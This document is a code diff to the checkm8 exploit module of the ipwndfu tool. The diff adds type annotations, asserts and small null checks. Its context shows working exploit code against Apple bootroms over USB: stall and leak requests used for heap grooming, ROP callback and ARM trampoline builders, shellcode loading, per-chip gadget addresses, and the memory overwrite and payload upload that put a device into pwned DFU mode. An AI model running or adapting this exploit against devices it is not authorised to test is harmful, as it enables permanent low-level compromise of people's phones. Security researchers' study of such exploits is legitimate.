@@ -5,11 +5,14 @@ import pkgutil
 import struct
 import sys
 import time
-import typing
 from contextlib import suppress
+from typing import TYPE_CHECKING, List, Optional, Tuple, Union
 
 import usb
 from ipwndfu import dfu
+
+if TYPE_CHECKING:
+    from usb.core import Device
 
 # Must be global so garbage collector never frees it
 request = None
@@ -17,11 +20,13 @@ transfer_ptr = None
 never_free_device = None
 
 
-def from_hex_str(dat):
+def from_hex_str(dat: str) -> bytes:
     return bytes(bytearray.fromhex(dat))
 
 
-def libusb1_create_ctrl_transfer(device, request, timeout):
+def libusb1_create_ctrl_transfer(device: "Device", request, timeout):
+    assert usb.backend.libusb1._lib
+
     ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)
     assert ptr is not None
 
@@ -40,8 +45,14 @@ def libusb1_create_ctrl_transfer(device, request, timeout):
 
 
 def libusb1_async_ctrl_transfer(
-    device, bm_request_type, b_request, w_value, w_index, data, timeout
-):
+    device: "Device",
+    bm_request_type: int,
+    b_request: int,
+    w_value: int,
+    w_index: int,
+    data: bytes,
+    timeout: float,
+) -> None:
     if usb.backend.libusb1._lib is not device._ctx.backend.lib:
         print(
             "ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting."
@@ -71,15 +82,23 @@ def libusb1_async_ctrl_transfer(
 
 
 def libusb1_no_error_ctrl_transfer(
-    device, bm_request_type, b_request, w_value, w_index, data_or_w_length, timeout
-):
+    device: "Device",
+    bm_request_type: int,
+    b_request: int,
+    w_value: int,
+    w_index: int,
+    data_or_w_length: Union[int, bytes],
+    timeout: int,
+) -> None:
     with suppress(usb.core.USBError):
         device.ctrl_transfer(
             bm_request_type, b_request, w_value, w_index, data_or_w_length, timeout
         )
 
 
-def usb_rop_callbacks(address, func_gadget, callbacks):
+def usb_rop_callbacks(
+    address: int, func_gadget: int, callbacks: List[Tuple[int, int]]
+) -> bytes:
     data = b""
     for i in range(0, len(callbacks), 5):
         block1 = b""
@@ -101,7 +120,7 @@ def usb_rop_callbacks(address, func_gadget, callbacks):
 
 
 # TODO: assert we are within limits
-def asm_arm64_branch(src, dest):
+def asm_arm64_branch(src: int, dest: int) -> bytes:
     if src > dest:
         value = 0x18000000 - (src - dest) // 4
     else:
@@ -111,7 +130,7 @@ def asm_arm64_branch(src, dest):
 
 # TODO: check if start offset % 4 would break it
 # LDR X7, [PC, #OFFSET]; BR X7
-def asm_arm64_x7_trampoline(dest):
+def asm_arm64_x7_trampoline(dest: int) -> bytes:
     return from_hex_str("47000058E0001FD6") + struct.pack("<Q", dest)
 
 
@@ -125,7 +144,7 @@ def asm_thumb_trampoline(src, dest):
         return struct.pack("<2I", 0xF002F8DF, dest)
 
 
-def prepare_shellcode(name, constants=None):
+def prepare_shellcode(name: str, constants: Optional[List[int]] = None) -> bytes:
     if constants is None:
         constants = []
     if name.endswith("_armv7"):
@@ -142,6 +161,7 @@ def prepare_shellcode(name, constants=None):
         sys.exit(1)
 
     shellcode = pkgutil.get_data("ipwndfu", f"bin/{name}.bin")
+    assert shellcode
 
     # Shellcode has placeholder values for constants; check they match and
     # replace with constants from config
@@ -156,27 +176,27 @@ def prepare_shellcode(name, constants=None):
     )
 
 
-def stall(device):
+def stall(device: "Device") -> None:
     libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, b"A" * 0xC0, 0.00001)
 
 
-def leak(device):
+def leak(device: "Device"):
     libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
 
 
-def no_leak(device):
+def no_leak(device: "Device") -> None:
     libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
 
 
-def usb_req_stall(device):
+def usb_req_stall(device: "Device") -> None:
     libusb1_no_error_ctrl_transfer(device, 0x2, 3, 0x0, 0x80, 0x0, 10)
 
 
-def usb_req_leak(device):
+def usb_req_leak(device: "Device") -> None:
     libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40, 1)
 
 
-def usb_req_no_leak(device):
+def usb_req_no_leak(device: "Device"):
     libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41, 1)
 
 
@@ -184,14 +204,16 @@ def usb_req_no_leak(device):
 class DeviceConfig:
     version: str
     cpid: int
-    large_leak: typing.Optional[int]
+    large_leak: Optional[int]
     overwrite: bytes
     overwrite_offset: int
-    hole: typing.Optional[int]
-    leak: typing.Optional[int]
+    hole: Optional[int]
+    leak: Optional[int]
 
-    def __post_init__(self):
+    def __post_init__(self) -> None:
         assert len(self.overwrite) <= 0x800
+        if not self.hole:
+            self.hole = 0
 
 
 PAYLOAD_OFFSET_ARMV7 = 384
@@ -200,7 +222,7 @@ PAYLOAD_OFFSET_ARM64 = 384
 PAYLOAD_SIZE_ARM64 = 576
 
 
-def payload(cpid):
+def payload(cpid: int) -> bytes:
     if cpid == 0x8947:
         constants_usb_s5l8947x = [
             0x34000000,  # 1 - LOAD_ADDRESS
@@ -717,8 +739,10 @@ def payload(cpid):
             t8015_shellcode,
         )
 
+    raise NotImplementedError("This SoC is not yet supported")
 
-def all_exploit_configs():
+
+def all_exploit_configs() -> List[DeviceConfig]:
     t8010_nop_gadget = 0x10000CC6C
     t8011_nop_gadget = 0x10000CD0C
     t8012_nop_gadget = 0x100008DB8
@@ -779,7 +803,7 @@ def all_exploit_configs():
     ]
 
 
-def exploit_config(serial_number):
+def exploit_config(serial_number: str) -> Tuple[bytes, DeviceConfig]:
     for config in all_exploit_configs():
         if f"SRTG:[{config.version}]" in serial_number:
             return payload(config.cpid), config
@@ -794,10 +818,11 @@ def exploit_config(serial_number):
     sys.exit(1)
 
 
-def exploit(match=None):
+def exploit(match: None = None) -> None:
     print("*** checkm8 exploit by axi0mX ***")
 
     device = dfu.acquire_device(match=match)
+    assert device
     start = time.time()
     print("Found:", device.serial_number)
     if "PWND:[" in device.serial_number:
@@ -812,14 +837,16 @@ def exploit(match=None):
         usb_req_no_leak(device)
     else:
         stall(device)
-        for _ in range(config.hole):
-            no_leak(device)
+        if config.hole:
+            for _ in range(config.hole):
+                no_leak(device)
         usb_req_leak(device)
         no_leak(device)
     dfu.usb_reset(device)
     dfu.release_device(device)
 
     device = dfu.acquire_device(match=match)
+    assert device
     device.__getattribute__("serial_number")
     libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b"A" * 0x800, 0.0001)
 
@@ -830,12 +857,14 @@ def exploit(match=None):
     time.sleep(0.5)
 
     device = dfu.acquire_device(match=match)
+    assert device
     usb_req_stall(device)
     if config.large_leak is not None:
         usb_req_leak(device)
     else:
-        for _ in range(config.leak):
-            usb_req_leak(device)
+        if config.leak:
+            for _ in range(config.leak):
+                usb_req_leak(device)
     libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)
     for i in range(0, len(payload), 0x800):
         libusb1_no_error_ctrl_transfer(
@@ -845,6 +874,8 @@ def exploit(match=None):
     dfu.release_device(device)
 
     device = dfu.acquire_device(match=match)
+    assert device
+
     if "PWND:[checkm8]" not in device.serial_number:
         print("ERROR: Exploit failed. Device did not enter pwned DFU Mode.")
         sys.exit(1)
